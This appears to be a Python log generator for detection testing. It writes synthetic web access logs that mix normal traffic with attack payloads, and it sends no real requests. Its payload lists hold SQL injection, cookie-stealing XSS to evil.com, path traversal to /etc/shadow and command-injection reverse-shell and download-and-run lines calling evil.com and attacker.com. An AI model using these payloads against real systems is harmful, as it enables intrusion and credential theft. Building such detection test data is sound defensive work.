"""
web_attack_simulator.py — Web Application Attack Log Generator

Simulates HTTP requests containing common web attack payloads against
a target web server. Generates Apache/Nginx-style access logs with
embedded attack signatures that detection rules should catch.

    MITRE ATT&CK:
    - T1190 — Exploit Public-Facing Application (SQLi, path traversal)
    - T1059.007 — Command and Scripting Interpreter: JavaScript (XSS)

Attack types generated:
    1. SQL Injection (UNION-based, error-based, blind)
    2. Cross-Site Scripting (reflected, stored payloads)
    3. Path Traversal (directory traversal to /etc/passwd, etc.)
    4. Command Injection (OS command chaining via semicolons, pipes)

Usage:
    python web_attack_simulator.py --events 300 --attack-types sqli,xss
"""

import sys
import random
import argparse
import urllib.parse
from pathlib import Path
from typing import Dict, Any, List

sys.path.insert(0, str(Path(__file__).parent.parent))
import config
from data_generators.base_generator import BaseGenerator


class WebAttackSimulator(BaseGenerator):
    """
    Generate HTTP access logs with embedded web attack payloads.
    
    Outputs mimic Apache Combined Log Format with attack indicators
    that Splunk detection rules can identify through field extraction
    and pattern matching.
    """

    # ── SQL Injection Payloads ───────────────────────────────
    SQLI_PAYLOADS = [
        "' OR 1=1--",
        "' UNION SELECT username,password FROM users--",
        "1; DROP TABLE users--",
        "' OR ''='",
        "admin'--",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
        "'; EXEC xp_cmdshell('whoami')--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1' ORDER BY 10--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
    ]

    # ── XSS Payloads ────────────────────────────────────────
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert('XSS')>",
        "javascript:alert(document.domain)",
        "<iframe src='javascript:alert(1)'>",
        "'\"><script>fetch('http://evil.com/steal?c='+document.cookie)</script>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
    ]

    # ── Path Traversal Payloads ──────────────────────────────
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/shadow",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00.jpg",
        "....\\....\\....\\windows\\win.ini",
    ]

    # ── Command Injection Payloads ───────────────────────────
    CMD_INJECTION_PAYLOADS = [
        "; cat /etc/passwd",
        "| whoami",
        "`id`",
        "$(cat /etc/shadow)",
        "; nc -e /bin/sh attacker.com 4444",
        "| curl http://evil.com/shell.sh | sh",
        "; wget http://evil.com/backdoor -O /tmp/bd",
        "& ping -c 10 evil.com &",
    ]

    # ── Normal Web Requests ──────────────────────────────────
    NORMAL_PATHS = [
        "/", "/index.html", "/about", "/contact", "/products",
        "/api/v1/users", "/api/v1/status", "/login", "/dashboard",
        "/static/css/main.css", "/static/js/app.js", "/images/logo.png",
        "/api/v1/search?q=laptop", "/api/v1/items?page=2&limit=20",
        "/blog/2026/02/security-best-practices",
    ]

    NORMAL_USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) Mobile/15E148",
    ]

    ATTACK_USER_AGENTS = [
        "sqlmap/1.7.12#stable (https://sqlmap.org)",
        "nikto/2.5.0",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "python-requests/2.31.0",
        "curl/8.4.0",
    ]

    HTTP_METHODS_NORMAL = ["GET", "GET", "GET", "POST", "HEAD"]
    HTTP_METHODS_ATTACK = ["GET", "POST", "PUT", "DELETE"]

    def __init__(self, attack_types: List[str] = None, **kwargs):
        super().__init__(
            name="web_attack",
            sourcetype="attack_sim:web",
            **kwargs,
        )
        self.attack_types = attack_types or ["sqli", "xss", "path_traversal", "cmd_injection"]

    def generate_malicious_event(self, timestamp: str) -> Dict[str, Any]:
        """
        Produce an HTTP request containing an attack payload.
        
        Randomly selects an attack type and embeds the payload
        in the URL query string or POST body.
        """
        attack_type = random.choice(self.attack_types)
        attacker_ip = random.choice(config.EXTERNAL_ATTACKER_IPS)
        target_host = config.TARGET_HOSTS["web-server-01"]

        payload, mitre_key = self._get_payload(attack_type)
        method = random.choice(self.HTTP_METHODS_ATTACK)
        url_path = self._build_attack_url(attack_type, payload)
        status_code = random.choice([200, 403, 500, 302])
        response_size = random.randint(200, 15000)

        return {
            "timestamp": timestamp,
            "event_type": "http_request",
            "hostname": "web-server-01",
            "src_ip": attacker_ip,
            "dst_ip": target_host["ip"],
            "dst_port": 443,
            "method": method,
            "url": url_path,
            "status_code": status_code,
            "response_size": response_size,
            "user_agent": random.choice(self.ATTACK_USER_AGENTS),
            "referer": "-",
            "attack_type": attack_type,
            "payload": payload,
            "severity": 3 if attack_type == "cmd_injection" else 4,
            "mitre_technique": config.MITRE_TECHNIQUES.get(
                mitre_key, config.MITRE_TECHNIQUES["sql_injection"]
            )["id"],
            "mitre_tactic": config.MITRE_TECHNIQUES.get(
                mitre_key, config.MITRE_TECHNIQUES["sql_injection"]
            )["tactic"],
            "message": f'{attacker_ip} - - "{method} {url_path} HTTP/1.1" {status_code} {response_size}',
            "is_malicious": True,
        }

    def generate_benign_event(self, timestamp: str) -> Dict[str, Any]:
        """
        Produce a normal HTTP access log entry — no attack payload.
        Represents legitimate user traffic the WAF and SIEM should ignore.
        """
        src_subnet = random.choice(config.INTERNAL_SUBNETS)
        src_ip = f"{src_subnet.split('/')[0].rsplit('.', 1)[0]}.{random.randint(10, 254)}"
        target_host = config.TARGET_HOSTS["web-server-01"]

        method = random.choice(self.HTTP_METHODS_NORMAL)
        url_path = random.choice(self.NORMAL_PATHS)
        status_code = random.choices([200, 301, 304, 404], weights=[0.7, 0.1, 0.1, 0.1])[0]
        response_size = random.randint(500, 50000)

        return {
            "timestamp": timestamp,
            "event_type": "http_request",
            "hostname": "web-server-01",
            "src_ip": src_ip,
            "dst_ip": target_host["ip"],
            "dst_port": 443,
            "method": method,
            "url": url_path,
            "status_code": status_code,
            "response_size": response_size,
            "user_agent": random.choice(self.NORMAL_USER_AGENTS),
            "referer": random.choice(["https://example.com", "-", "https://google.com"]),
            "severity": 6,
            "message": f'{src_ip} - - "{method} {url_path} HTTP/1.1" {status_code} {response_size}',
            "is_malicious": False,
        }

    def _get_payload(self, attack_type: str):
        """Select a random payload for the given attack type."""
        payload_map = {
            "sqli":           (self.SQLI_PAYLOADS,           "sql_injection"),
            "xss":            (self.XSS_PAYLOADS,            "xss"),
            "path_traversal": (self.PATH_TRAVERSAL_PAYLOADS, "sql_injection"),
            "cmd_injection":  (self.CMD_INJECTION_PAYLOADS,  "sql_injection"),
        }
        payloads, mitre_key = payload_map.get(attack_type, (self.SQLI_PAYLOADS, "sql_injection"))
        return random.choice(payloads), mitre_key

    def _build_attack_url(self, attack_type: str, payload: str) -> str:
        """Embed attack payload into a realistic URL query parameter."""
        base_paths = {
            "sqli":           ["/api/v1/users?id=", "/search?q=", "/products?category="],
            "xss":            ["/search?q=", "/comment?text=", "/profile?name="],
            "path_traversal": ["/files?path=", "/download?file=", "/view?doc="],
            "cmd_injection":  ["/api/v1/ping?host=", "/tools/lookup?domain=", "/health?check="],
        }
        base = random.choice(base_paths.get(attack_type, ["/search?q="]))
        return base + urllib.parse.quote(payload, safe="")


# ── CLI Entry Point ──────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="Generate web application attack logs"
    )
    parser.add_argument("--events", type=int, default=300)
    parser.add_argument("--attack-types", type=str, default="sqli,xss,path_traversal,cmd_injection",
                        help="Comma-separated attack types")
    parser.add_argument("--format", choices=["json", "syslog", "cef"], default="json")
    parser.add_argument("--time-span", type=int, default=24)
    args = parser.parse_args()

    simulator = WebAttackSimulator(
        attack_types=args.attack_types.split(","),
        event_count=args.events,
        log_format=args.format,
        time_span_hours=args.time_span,
    )
    simulator.run()


if __name__ == "__main__":
    main()
